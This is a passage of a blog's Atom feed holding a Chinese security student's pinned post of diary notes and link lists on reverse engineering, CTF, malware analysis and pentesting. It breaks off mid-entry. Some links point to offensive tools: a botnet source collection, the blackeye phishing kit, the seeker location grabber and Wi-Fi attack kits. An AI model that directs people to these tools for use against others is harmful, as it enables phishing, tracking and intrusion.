<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K&#39;s House</title>
  <icon>https://kabeor.github.io/icon.png</icon>
  
  <link href="https://kabeor.github.io/atom.xml" rel="self"/>
  
  <link href="https://kabeor.github.io/"/>
  <updated>2020-09-07T16:03:58.413Z</updated>
  <id>https://kabeor.github.io/</id>
  
  <author>
    <name>kabeor</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>写在前面的话</title>
    <link href="https://kabeor.github.io/Top/"/>
    <id>https://kabeor.github.io/Top/</id>
    <published>2098-12-31T16:00:00.000Z</published>
    <updated>2020-09-07T16:03:58.413Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h1><p><del>一直想要写这个了，每天记录，每周上传吧，把每天有意思的事物写下来</del></p><h2 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h2><p>先解答一些包括我也很崩溃的问题</p><ol><li>更换了博客主题，不知道访问效果怎么样，欢迎留言。</li><li>待补充，欢迎提问<blockquote><p>大四<br><a href="https://github.com/qilingframework/qiling" target="_blank" rel="noopener">https://github.com/qilingframework/qiling</a> 主要贡献者, 求个star不过分吧?</p></blockquote></li></ol><hr><h2 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h2><h3 id="2020-3-16"><a href="#2020-3-16" class="headerlink" title="2020.3.16"></a>2020.3.16</h3><p>把博客迁移到了16寸的MBP上了，之前主题的npm包总是少东西，索性换了新主题，还不错！</p><p>MBP爽爆了</p><h3 id="2019-7-29"><a href="#2019-7-29" class="headerlink" title="2019.7.29"></a>2019.7.29</h3><p>还有一个月就大三了，感觉时间过的好快。。</p><h3 id="2018-11-22"><a href="#2018-11-22" class="headerlink" title="2018.11.22"></a>2018.11.22</h3><p>马上考试了，有点忙，最近估计更的要慢一点了<br>上星期的校赛打了AWD，既当主办方又当比赛成员，还好抱大腿拿了第一2333</p><h3 id="2018-10-18"><a href="#2018-10-18" class="headerlink" title="2018.10.18"></a>2018.10.18</h3><p>国庆假期回来就一直很忙，实验报告好多。。。</p><p><strong>Pin-in-CTF 学习整理记录</strong><br><a href="https://mp.weixin.qq.com/s/ch-WYgkpg5iDcppOPzCpRQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ch-WYgkpg5iDcppOPzCpRQ</a></p><p><strong>Fuzzing技术总结与工具列表</strong><br><a href="https://zhuanlan.zhihu.com/p/43432370" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/43432370</a></p><p><strong>用于检测 Windows PE 文件保护机制开启情况的工具 Winchecksec</strong><br><a href="https://blog.trailofbits.com/2018/09/26/effortless-security-feature-detection-with-winchecksec/" target="_blank" rel="noopener">https://blog.trailofbits.com/2018/09/26/effortless-security-feature-detection-with-winchecksec/</a></p><p><strong>使用树莓派搭建拦截广告的 DNS 服务器 Pi-hole</strong><br><a href="https://www.troyhunt.com/mmm-pi-hole/" target="_blank" rel="noopener">https://www.troyhunt.com/mmm-pi-hole/</a></p><p><strong>使用 Powershell 查看无线网络配置的密码</strong><br><a href="https://blogs.technet.microsoft.com/heyscriptingguy/2017/01/13/view-passwords-of-wireless-profiles-without-using-netsh-exe/" target="_blank" rel="noopener">https://blogs.technet.microsoft.com/heyscriptingguy/2017/01/13/view-passwords-of-wireless-profiles-without-using-netsh-exe/</a></p><p><strong>Modernizing IDA Pro: how to make processor module glitches go away</strong><br><a href="http://blog.ptsecurity.com/2018/10/modernizing-ida-pro-how-to-make.html" target="_blank" rel="noopener">http://blog.ptsecurity.com/2018/10/modernizing-ida-pro-how-to-make.html</a></p><h3 id="2018-9-23"><a href="#2018-9-23" class="headerlink" title="2018.9.23"></a>2018.9.23</h3><p><strong>DLL 劫持原理</strong><br><a href="https://astr0baby.wordpress.com/2018/09/08/understanding-how-dll-hijacking-works/" target="_blank" rel="noopener">https://astr0baby.wordpress.com/2018/09/08/understanding-how-dll-hijacking-works/</a></p><p><strong>使用 Ubuntu 进行 x86-64 汇编语言编程(PDF)</strong><br><a href="http://www.egr.unlv.edu/~ed/assembly64.pdf" target="_blank" rel="noopener">http://www.egr.unlv.edu/~ed/assembly64.pdf</a></p><h3 id="2018-9-4"><a href="#2018-9-4" class="headerlink" title="2018.9.4"></a>2018.9.4</h3><p><strong>符号执行——从入门到上高速</strong><br><a href="https://www.anquanke.com/post/id/157928" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157928</a></p><p><strong>Python恶意软件分析入门</strong><br><a href="https://xz.aliyun.com/t/2688" target="_blank" rel="noopener">https://xz.aliyun.com/t/2688</a></p><p><strong>botnets - 僵尸网络恶意软件源码收集仓库</strong><br><a href="https://github.com/maestron/botnets" target="_blank" rel="noopener">https://github.com/maestron/botnets</a></p><h3 id="2018-9-2"><a href="#2018-9-2" class="headerlink" title="2018.9.2"></a>2018.9.2</h3><p><strong>基于深度学习的恶意样本行为检测（含源码）</strong><br><a href="https://www.anquanke.com/post/id/158320" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158320</a></p><p><strong>逆向分析自定义格式加载的恶意软件：Hidden Bee</strong><br><a href="https://blog.malwarebytes.com/threat-analysis/2018/08/reversing-malware-in-a-custom-format-hidden-bee-elements/" target="_blank" rel="noopener">https://blog.malwarebytes.com/threat-analysis/2018/08/reversing-malware-in-a-custom-format-hidden-bee-elements/</a></p><h3 id="2018-8-30"><a href="#2018-8-30" class="headerlink" title="2018.8.30"></a>2018.8.30</h3><p>开学很忙，一直没顾上更</p><p><strong>Web渗透测试笔记</strong><br><a href="https://xz.aliyun.com/t/2516" target="_blank" rel="noopener">https://xz.aliyun.com/t/2516</a></p><p><strong>逆向相关的wiki分享</strong><br><a href="https://lichao890427.github.io/wiki/" target="_blank" rel="noopener">https://lichao890427.github.io/wiki/</a></p><p><strong>机器学习的数学基础</strong><br><a href="https://mp.weixin.qq.com/s/Cm-DNNLMqgcp_DJqUeM-Tw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Cm-DNNLMqgcp_DJqUeM-Tw</a></p><p><strong>Windows下反反调试技术汇总</strong><br><a href="http://www.freebuf.com/articles/others-articles/181085.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/others-articles/181085.html</a></p><p><strong>A huge list of tools for CTF / Bug Bounties.</strong><br><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank" rel="noopener">https://bitvijays.github.io/LFC-VulnerableMachines.html</a></p><p><strong>CS:GO 远程代码执行 0-day - Real World CTF 资格赛 2018 解题报告</strong><br><a href="https://blog.perfect.blue/P90_Rush_B" target="_blank" rel="noopener">https://blog.perfect.blue/P90_Rush_B</a></p><p><strong>在 Linux 上模拟 macOS 的工具</strong><br><a href="https://github.com/darlinghq/darling" target="_blank" rel="noopener">https://github.com/darlinghq/darling</a></p><p><strong>逆向工程框架 - Miasm2，作者通过 IR 实现了符号执行，虚拟机对抗和shellcode 模拟执行等功能，来自 BlackHat USA 2018</strong><br><a href="http://i.blackhat.com/us-18/Wed-August-8/us-18-DesclauxMougey-Miasm-Reverse-Engineering-Framework.pdf" target="_blank" rel="noopener">http://i.blackhat.com/us-18/Wed-August-8/us-18-DesclauxMougey-Miasm-Reverse-Engineering-Framework.pdf</a></p><p><strong>Runbooks - 各个方向的安全技术收集</strong><br><a href="https://github.com/sneakerhax/Runbooks" target="_blank" rel="noopener">https://github.com/sneakerhax/Runbooks</a></p><p><strong>逆向一个密码保护的反向shell代码</strong><br><a href="https://scriptdotsh.com/index.php/2018/07/26/ground-zero-part-1-2-reverse-engineering-password-protected-reverse-shells-linux-x64/" target="_blank" rel="noopener">https://scriptdotsh.com/index.php/2018/07/26/ground-zero-part-1-2-reverse-engineering-password-protected-reverse-shells-linux-x64/</a> </p><p><strong>逆向一个windows下的crackme</strong><br><a href="https://scriptdotsh.com/index.php/2018/06/09/ground-zero-part-2-3-reverse-engineering-building-cracked-binaries-windows-x64/" target="_blank" rel="noopener">https://scriptdotsh.com/index.php/2018/06/09/ground-zero-part-2-3-reverse-engineering-building-cracked-binaries-windows-x64/</a> </p><p><strong>使用 r2 进行 arm64 架构二进制文件的 patch</strong><br><a href="https://scriptdotsh.com/index.php/2018/08/13/reverse-engineering-patching-binaries-with-radare2-arm-aarch64/" target="_blank" rel="noopener">https://scriptdotsh.com/index.php/2018/08/13/reverse-engineering-patching-binaries-with-radare2-arm-aarch64/</a></p><p><strong>blackeye - 整合了32个网站模板的钓鱼工具</strong><br><a href="https://github.com/thelinuxchoice/blackeye" target="_blank" rel="noopener">https://github.com/thelinuxchoice/blackeye</a></p><p><strong>用 IDAPython 解密 Gootkit 中的字符串</strong><br><a href="http://johnpeng47.com/2018/08/14/decrypting-strings-in-the-gootkit-with-idapython/" target="_blank" rel="noopener">http://johnpeng47.com/2018/08/14/decrypting-strings-in-the-gootkit-with-idapython/</a></p><p><strong>使用 Radare2 模拟解密函数</strong><br><a href="http://www.mien.in/2018/08/14/emulating-decryption-function-with-radare2/" target="_blank" rel="noopener">http://www.mien.in/2018/08/14/emulating-decryption-function-with-radare2/</a></p><h3 id="2018-8-3"><a href="#2018-8-3" class="headerlink" title="2018.8.3"></a>2018.8.3</h3><p><strong>CTF中常见的RSA相关问题总结</strong><br><a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">https://xz.aliyun.com/t/2446</a></p><p><strong>x86_64逆向工程简介</strong><br><a href="https://xz.aliyun.com/t/2487" target="_blank" rel="noopener">https://xz.aliyun.com/t/2487</a></p><p><strong>x86 汇编字符串指令总结</strong><br><a href="https://medium.com/@ophirharpaz/a-summary-of-x86-string-instructions-87566a28c20c" target="_blank" rel="noopener">https://medium.com/@ophirharpaz/a-summary-of-x86-string-instructions-87566a28c20c</a></p><p><strong>动态二进制插桩的原理和基本实现</strong><br><a href="http://deniable.org/reversing/binary-instrumentation" target="_blank" rel="noopener">http://deniable.org/reversing/binary-instrumentation</a></p><p><strong>seeker - 获取高精度地理信息和设备信息的工具</strong><br><a href="https://github.com/thewhiteh4t/seeker" target="_blank" rel="noopener">https://github.com/thewhiteh4t/seeker</a></p><p><strong>现代二进制漏洞利用课程，由Rensselaer Polytechnic Institute的 RPISEC团队开发制作</strong><br><a href="http://security.cs.rpi.edu/courses/binexp-spring2015/" target="_blank" rel="noopener">http://security.cs.rpi.edu/courses/binexp-spring2015/</a></p><p><strong>使用树莓派制作一个迷你的 wifi 攻击器</strong><br><a href="https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/" target="_blank" rel="noopener">https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/</a></p><h3 id="2018-7-19"><a href="#2018-7-19" class="headerlink" title="2018.7.19"></a>2018.7.19</h3><p>练车真的很烦。。。<br><strong>cutter: A Qt and C++ GUI for radare2 reverse engineering framework</strong><br><a href="https://github.com/radareorg/cutter" target="_blank" rel="noopener">https://github.com/radareorg/cutter</a></p><p><strong>PassphraseGen - 用于生成自定义密码短语列表的脚本，方便使用 hashcat 进行密码破解</strong><br><a href="https://github.com/dafthack/PassphraseGen" target="_blank" rel="noopener">https://github.com/dafthack/PassphraseGen</a></p><p><strong>ISSISP 18 符号执行与模糊测试</strong><br><a href="https://cs.anu.edu.au/cybersec/issisp2018/assets/slides/AbhikISSISPMon.pdf" target="_blank" rel="noopener">https://cs.anu.edu.au/cybersec/issisp2018/assets/slides/AbhikISSISPMon.pdf</a></p><p><strong>ISSISP 18 基于符号执行的自动程序修复</strong><br><a href="https://cs.anu.edu.au/cybersec/issisp2018/assets/slides/AbhikISSISPWed.pdf" target="_blank" rel="noopener">https://cs.anu.edu.au/cybersec/issisp2018/assets/slides/AbhikISSISPWed.pdf</a></p><p><strong>Pwn Adventure 3</strong><br><a href="http://pwnadventure.com/" target="_blank" rel="noopener">http://pwnadventure.com/</a></p><p><strong>通过 Pwn Adventure 3 游戏学习 FRIDA</strong><br><a href="https://x-c3ll.github.io/posts/Frida-Pwn-Adventure-3/" target="_blank" rel="noopener">https://x-c3ll.github.io/posts/Frida-Pwn-Adventure-3/</a></p><p><strong>针对 Raspberry Pi 的内核研究</strong><br><a href="http://blog.k3170makan.com/2018/07/reversing-bare-bones-raspberry-pi.html" target="_blank" rel="noopener">http://blog.k3170makan.com/2018/07/reversing-bare-bones-raspberry-pi.html</a></p><p><strong>如何使用 IDAPython 寻找漏洞</strong><br><a href="https://www.somersetrecon.com/blog/2018/7/6/introduction-to-idapython-for-vulnerability-hunting" target="_blank" rel="noopener">https://www.somersetrecon.com/blog/2018/7/6/introduction-to-idapython-for-vulnerability-hunting</a></p><p><strong>killerbee - 攻击 ZigBee 以及 IEEE 802.15.4 网络的工具集</strong><br><a href="https://github.com/riverloopsec/killerbee" target="_blank" rel="noopener">https://github.com/riverloopsec/killerbee</a></p><p><strong>ropgenerator - 帮助构造 ROP 链的工具</strong><br><a href="https://github.com/Boyan-MILANOV/ropgenerator" target="_blank" rel="noopener">https://github.com/Boyan-MILANOV/ropgenerator</a></p><p><strong>Bypass Data Execution Protection绕过方法介绍</strong><br><a href="https://movaxbx.ru/2018/07/16/bypass-data-execution-protection-dep/" target="_blank" rel="noopener">https://movaxbx.ru/2018/07/16/bypass-data-execution-protection-dep/</a></p><p><strong>METASPLOIT TUTORIALS</strong><br><a href="https://www.hackingtutorials.org/category/metasploit-tutorials/" target="_blank" rel="noopener">https://www.hackingtutorials.org/category/metasploit-tutorials/</a></p><p><strong>mcsema - 一款二进制转换工具，可将机器码转换为LLVM中间代码，并提供了 IDA 和binninja 的接口脚本</strong><br><a href="https://github.com/trailofbits/mcsema" target="_blank" rel="noopener">https://github.com/trailofbits/mcsema</a></p><p><strong>Review:Offensive Security Certified Professional (OSCP)</strong><br><a href="https://www.hackingtutorials.org/hacking-courses/offensive-security-certified-professional-oscp/" target="_blank" rel="noopener">https://www.hackingtutorials.org/hacking-courses/offensive-security-certified-professional-oscp/</a></p><p><strong>如何开始逆向学习与病毒分析</strong><br><a href="https://hshrzd.wordpress.com/how-to-start/" target="_blank" rel="noopener">https://hshrzd.wordpress.com/how-to-start/</a></p><p><strong>对 PE 文件签名的深入研究</strong><br><a href="http://research32.blogspot.com/2016/03/pe-file-signing.html" target="_blank" rel="noopener">http://research32.blogspot.com/2016/03/pe-file-signing.html</a></p><h3 id="2018-7-10"><a href="#2018-7-10" class="headerlink" title="2018.7.10"></a>2018.7.10</h3><p><strong>GBA 游戏机自定义固件的源码</strong><br><a href="https://github.com/ez-flash/omega-kernel" target="_blank" rel="noopener">https://github.com/ez-flash/omega-kernel</a></p><p><strong>warberry - 为树莓派设计的渗透测试工具包</strong><br><a href="https://github.com/secgroundzero/warberry" target="_blank" rel="noopener">https://github.com/secgroundzero/warberry</a></p><p><strong>使用 r2pipe 协助逆向分析</strong><br><a href="https://goggleheadedhacker.com/blog/post/8" target="_blank" rel="noopener">https://goggleheadedhacker.com/blog/post/8</a></p><p><strong>hawkeye - 从文件系统中搜索敏感文件的工具</strong><br><a href="https://github.com/Ice3man543/hawkeye" target="_blank" rel="noopener">https://github.com/Ice3man543/hawkeye</a></p><p><strong>trackerjacker-无线网络追踪工具</strong><br><a href="https://github.com/calebmadrigal/trackerjacker" target="_blank" rel="noopener">https://github.com/calebmadrigal/trackerjacker</a></p><p><strong>weixin:// 跳转研究</strong><br><a href="http://t.cn/Rdpmd8L" target="_blank" rel="noopener">http://t.cn/Rdpmd8L</a></p><p><strong>collection-document:优质安全文章收藏,长期更新</strong><br><a href="https://github.com/tom0li/collection-document" target="_blank" rel="noopener">https://github.com/tom0li/collection-document</a></p><p><strong>IDA Pro plugin to make functions tree view</strong><br><a href="https://github.com/ax330d/functions-plus" target="_blank" rel="noopener">https://github.com/ax330d/functions-plus</a></p><h3 id="2018-7-5"><a href="#2018-7-5" class="headerlink" title="2018.7.5"></a>2018.7.5</h3><p>今天参加了2018工业信息安全技能大赛，实际的分析了一次工业固件，感觉难度很大，之前也没有接触过工控安全，还是挺有趣的，参赛选手大多是掉光头发的中年man。。。</p><p><strong>The Return of Disassembly Desynchronization</strong><br><a href="https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/the_return_of_disassembly_desynchronization/the_return_of_disassembly_desynchronization.md" target="_blank" rel="noopener">https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/the_return_of_disassembly_desynchronization/the_return_of_disassembly_desynchronization.md</a></p><p><strong>Zeratool - 自动化生成漏洞利用并寻找 Flag 的 CTF 比赛工具</strong><br><a href="https://github.com/ChrisTheCoolHut/Zeratool" target="_blank" rel="noopener">https://github.com/ChrisTheCoolHut/Zeratool</a></p><p><strong>Detecting Reverse Engineering with Canaries</strong><br><a href="https://mulliner.org/collin/publications/Detecting_Reverse_Engineering_with_Canaries_CanSecWest2018.pdf" target="_blank" rel="noopener">https://mulliner.org/collin/publications/Detecting_Reverse_Engineering_with_Canaries_CanSecWest2018.pdf</a></p><p><strong>10 Cool Nmap Tricks and Techniques</strong><br><a href="https://blog.urfix.com/10-cool-nmap-tricks-techniques/" target="_blank" rel="noopener">https://blog.urfix.com/10-cool-nmap-tricks-techniques/</a></p><p><strong>基于 QEMU 的逆向分析沙箱 PyREBox</strong><br><a href="https://github.com/Cisco-Talos/pyrebox/tree/master/exploit_detect" target="_blank" rel="noopener">https://github.com/Cisco-Talos/pyrebox/tree/master/exploit_detect</a></p><p><strong>针对 ELF 文件格式的解析与利用</strong><br><a href="https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267" target="_blank" rel="noopener">https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267</a></p><p><strong>使用 IDA Python 进行相似漏洞搜索</strong><br><a href="https://www.zerodayinitiative.com/blog/2018/6/26/mindshare-variant-hunting-with-ida-python" target="_blank" rel="noopener">https://www.zerodayinitiative.com/blog/2018/6/26/mindshare-variant-hunting-with-ida-python</a></p><p><strong>The 101 of ELF files on Linux</strong><br><a href="https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/" target="_blank" rel="noopener">https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/</a></p><p><strong>初学者的逆向工程学习网站</strong><br><a href="https://begin.re" target="_blank" rel="noopener">https://begin.re</a></p><p><strong>rogue - 无线网络攻击工具包</strong><br><a href="https://github.com/InfamousSYN/rogue" target="_blank" rel="noopener">https://github.com/InfamousSYN/rogue</a></p><p><strong>反调试及绕过</strong><br><a href="http://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E8%B0%83%E8%AF%95%E5%8F%8A%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">http://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E8%B0%83%E8%AF%95%E5%8F%8A%E7%BB%95%E8%BF%87/</a></p><p><strong>基于CTF挑战写就的二进制分析课程</strong>(很棒！)<br><a href="https://maxkersten.nl/binary-analysis-course/" target="_blank" rel="noopener">https://maxkersten.nl/binary-analysis-course/</a></p><p><strong>Intro to x86 Assembly Language</strong><br>视频:  <a href="https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe" target="_blank" rel="noopener">https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe</a><br>代码:  <a href="https://github.com/code-tutorials/assembly-intro" target="_blank" rel="noopener">https://github.com/code-tutorials/assembly-intro</a></p><p><strong>awesome-ninja-admins</strong><br><a href="https://github.com/trimstray/awesome-ninja-admins" target="_blank" rel="noopener">https://github.com/trimstray/awesome-ninja-admins</a></p><p><strong>信息安全知识库 2018全站离线打包</strong><br><a href="https://pan.baidu.com/s/1gf4Brb1#list/path=%2F" target="_blank" rel="noopener">https://pan.baidu.com/s/1gf4Brb1#list/path=%2F</a></p><p><strong>Docker概念详细的介绍</strong><br><a href="https://mp.weixin.qq.com/s?__biz=MzU4NDQ4MzU5OA==&amp;mid=2247484127&amp;idx=1&amp;sn=70ee95619ec761da884c4f9af3e83194&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU4NDQ4MzU5OA==&amp;mid=2247484127&amp;idx=1&amp;sn=70ee95619ec761da884c4f9af3e83194&amp;scene=21#wechat_redirect</a></p><p><strong>ip2region:ip地址定位库，0.0x毫秒级查询，数据库文件大小只有1.5M</strong><br><a href="http://t.cn/Rt9u3Ef" target="_blank" rel="noopener">http://t.cn/Rt9u3Ef</a></p><h3 id="2018-6-23"><a href="#2018-6-23" class="headerlink" title="2018.6.23"></a>2018.6.23</h3><p><strong>针对恶意软件逆向工程的新手引导大挑战</strong><br><a href="https://www.malwaretech.com/beginner-malware-reversing-challenges" target="_blank" rel="noopener">https://www.malwaretech.com/beginner-malware-reversing-challenges</a></p><p><strong>Hook原理</strong><br><a href="https://bbs.pediy.com/thread-228669.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-228669.htm</a></p><p><strong>用Python任意下载爱奇艺VIP视频</strong><br><a href="https://www.77169.com/html/211389.html" target="_blank" rel="noopener">https://www.77169.com/html/211389.html</a></p><h3 id="2018-6-20"><a href="#2018-6-20" class="headerlink" title="2018.6.20"></a>2018.6.20</h3><p>放假快乐！</p><p><strong>使用Radare2和Cutter解密APT33的Dropshot恶意软件</strong><br><a href="https://www.megabeets.net/decrypting-dropshot-with-radare2-and-cutter-part-1/" target="_blank" rel="noopener">https://www.megabeets.net/decrypting-dropshot-with-radare2-and-cutter-part-1/</a></p><p><strong>A journey into Radare2</strong><br><a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/" target="_blank" rel="noopener">https://github.com/ITAYC0HEN/A-journey-into-Radare2/</a></p><p><strong>逆向工程的发展过程回顾与展望，来自 SSTIC 2018 Halvar Flake</strong><br><a href="https://docs.google.com/presentation/d/1ljVUiXVi2PfEdolGXr7Wpepj0x2RxaOo9rzMKWXebG4/mobilepresent?slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1ljVUiXVi2PfEdolGXr7Wpepj0x2RxaOo9rzMKWXebG4/mobilepresent?slide=id.p</a></p><p><strong>x86 assembly doesn’t have to be scary (interactive)</strong><br><a href="https://blog.benjojo.co.uk/post/interactive-x86-bootloader-tutorial" target="_blank" rel="noopener">https://blog.benjojo.co.uk/post/interactive-x86-bootloader-tutorial</a></p><p><strong>Penetration-Testing - 渗透测试方向优秀资源收集</strong><br><a href="https://github.com/Kinimiwar/Penetration-Testing" target="_blank" rel="noopener">https://github.com/Kinimiwar/Penetration-Testing</a></p><p><strong>Reverse-engineered Diablo source code</strong><br><a href="https://github.com/galaxyhaxz/devilution" target="_blank" rel="noopener">https://github.com/galaxyhaxz/devilution</a></p><h3 id="2018-6-15"><a href="#2018-6-15" class="headerlink" title="2018.6.15"></a>2018.6.15</h3><p><strong>使用 ptrace 进行反调试并实现对 ptrace 的隐藏调用</strong><br><a href="https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/hiding_call_to_ptrace/hiding_call_to_ptrace.md" target="_blank" rel="noopener">https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/hiding_call_to_ptrace/hiding_call_to_ptrace.md</a></p><p><strong>如何在网络安全领域获得职业的成功：信息安全入门，学习，练习和成长指南(Daniel Miessler)</strong><br><a href="https://danielmiessler.com/blog/build-successful-infosec-career/" target="_blank" rel="noopener">https://danielmiessler.com/blog/build-successful-infosec-career/</a></p><p><strong>手查PE导出表</strong><br><a href="https://bbs.pediy.com/thread-205989.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-205989.htm</a></p><p><strong>手查PE重定向</strong><br><a href="https://bbs.pediy.com/thread-206072.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-206072.htm</a></p><h3 id="2018-6-14"><a href="#2018-6-14" class="headerlink" title="2018.6.14"></a>2018.6.14</h3><p><strong>深入解析虚拟化</strong><br><a href="https://saferwall.com/blog" target="_blank" rel="noopener">https://saferwall.com/blog</a></p><h3 id="2018-6-13"><a href="#2018-6-13" class="headerlink" title="2018.6.13"></a>2018.6.13</h3><p><strong>栈溢出攻击原理实例详解</strong><br><a href="http://www.purpleroc.com/html/961247.html" target="_blank" rel="noopener">http://www.purpleroc.com/html/961247.html</a></p><h3 id="2018-6-12"><a href="#2018-6-12" class="headerlink" title="2018.6.12"></a>2018.6.12</h3><p><strong>逆向基于 Unity 引擎的 Android 游戏 Temple Run（神庙逃亡）</strong><br><a href="https://www.rotlogix.com/blog/2018/6/10/reverse-engineering-android-unity-games-part-one" target="_blank" rel="noopener">https://www.rotlogix.com/blog/2018/6/10/reverse-engineering-android-unity-games-part-one</a></p><h3 id="2018-6-11"><a href="#2018-6-11" class="headerlink" title="2018.6.11"></a>2018.6.11</h3><p><strong>C语言实现虚拟机</strong><br><a href="https://felixangell.com/blog/virtual-machine-in-c" target="_blank" rel="noopener">https://felixangell.com/blog/virtual-machine-in-c</a></p><p><strong>C语言实现哈希表</strong><br><a href="https://github.com/jamesroutley/write-a-hash-table" target="_blank" rel="noopener">https://github.com/jamesroutley/write-a-hash-table</a></p><h3 id="2018-6-10"><a href="#2018-6-10" class="headerlink" title="2018.6.10"></a>2018.6.10</h3><p><strong>FC机之超级玛丽简单逆向分析</strong><br><a href="https://bbs.pediy.com/thread-175564.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-175564.htm</a></p><h3 id="2018-6-9"><a href="#2018-6-9" class="headerlink" title="2018.6.9"></a>2018.6.9</h3><p><strong>全球气候可视化</strong><br><a href="https://earth.nullschool.net/" target="_blank" rel="noopener">https://earth.nullschool.net/</a></p><p><strong>图片文字清除插件</strong><br><a href="https://projectnaptha.com/" target="_blank" rel="noopener">https://projectnaptha.com/</a></p><p><strong>一个神奇的手绘公式网站</strong><br><a href="http://webdemo.myscript.com/" target="_blank" rel="noopener">http://webdemo.myscript.com/</a></p><p><strong>电影台词检索网站(英文)</strong><br><a href="http://www.subzin.com/" target="_blank" rel="noopener">http://www.subzin.com/</a></p><h3 id="2018-6-8"><a href="#2018-6-8" class="headerlink" title="2018.6.8"></a>2018.6.8</h3><p><strong>一本面向极客，致力于提高 Mac 工作效率的实用手册</strong><br><a href="https://bestswifter.gitbook.io/effectivemac/" target="_blank" rel="noopener">https://bestswifter.gitbook.io/effectivemac/</a></p><p><strong>raspberry-pi-os - 使用 Linux 内核和 Raspberry Pi 进行操作系统开发的学习指南</strong><br><a href="https://github.com/s-matyukevich/raspberry-pi-os" target="_blank" rel="noopener">https://github.com/s-matyukevich/raspberry-pi-os</a></p><p><strong>虚拟机保护逆向入门</strong><br><a href="http://t.cn/RB7VCDU" target="_blank" rel="noopener">http://t.cn/RB7VCDU</a></p><h3 id="2018-6-6"><a href="#2018-6-6" class="headerlink" title="2018.6.6"></a>2018.6.6</h3><p>最近忙于复习</p><p><strong>符号执行引擎KLEE</strong><br><a href="http://klee.github.io/" target="_blank" rel="noopener">http://klee.github.io/</a></p><p><a href="https://srg.doc.ic.ac.uk/klee18/schedule.html" target="_blank" rel="noopener">https://srg.doc.ic.ac.uk/klee18/schedule.html</a></p><h3 id="2018-6-2"><a href="#2018-6-2" class="headerlink" title="2018.6.2"></a>2018.6.2</h3><p>复习了几天，今天考完几门，下下星期还得考高数，惆怅</p><p><strong>漫画风讲解DNS over HTTPS</strong><br><a href="https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/" target="_blank" rel="noopener">https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/</a></p><hr><h3 id="2018-5-25-27"><a href="#2018-5-25-27" class="headerlink" title="2018.5.25-27"></a>2018.5.25-27</h3><p>这两天在大佬的带领下参加了川渝赛区的西普杯信息安全铁人三项赛<br>赛题分为数据赛，个人赛和企业赛<br>数据赛为数据流量分析，企业赛为渗透真实企业环境都算是web吧应该<br>个人赛是pwn！pwn！pwn！<br>于是盯了一天的pwn1，是道rop的题，pwn师傅肯定两分钟就做出来了。。作为re菜鸡只能现学现卖，先逆了遍流程(反正也不会pwn)，然后照着网上的资料，用ROPgadget( <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a> )生成了rop利用链，然后copy一个exp，改一改，运行。最后因为经验不足，没有找到真正的溢出长度，于是就很遗憾了(还是因为太菜</p><p>这次比赛给我感触很大，在实际的环境当中要懂的不仅仅是软件自身的保护，还应该了解网络以及软件对用户的保障。在信息安全竞赛中，也应该拓宽自己的知识面，才能灵活应对。</p><p>就写这么多吧，还是挺开心的</p><hr><h3 id="2018-5-24"><a href="#2018-5-24" class="headerlink" title="2018.5.24"></a>2018.5.24</h3><p>Miasm的博客，研究<strong>动态符号执行</strong><br><a href="http://www.miasm.re/blog/index.html" target="_blank" rel="noopener">http://www.miasm.re/blog/index.html</a></p><p><strong>The Legend of Random的系列教程</strong><br><a href="https://legend.octopuslabs.io/index.html" target="_blank" rel="noopener">https://legend.octopuslabs.io/index.html</a></p><hr><h3 id="2018-5-23"><a href="#2018-5-23" class="headerlink" title="2018.5.23"></a>2018.5.23</h3><p>今天做完了那天的题，写了wp</p><p>Dwarf Fortress真的很有意思，找到一个很易懂的教程 <a href="https://df-walkthrough.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://df-walkthrough.readthedocs.io/en/latest/</a></p><p><strong>理解与分析 ELF 二进制文件格式</strong><br> <a href="https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/" target="_blank" rel="noopener">https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/</a></p><p><strong>使用 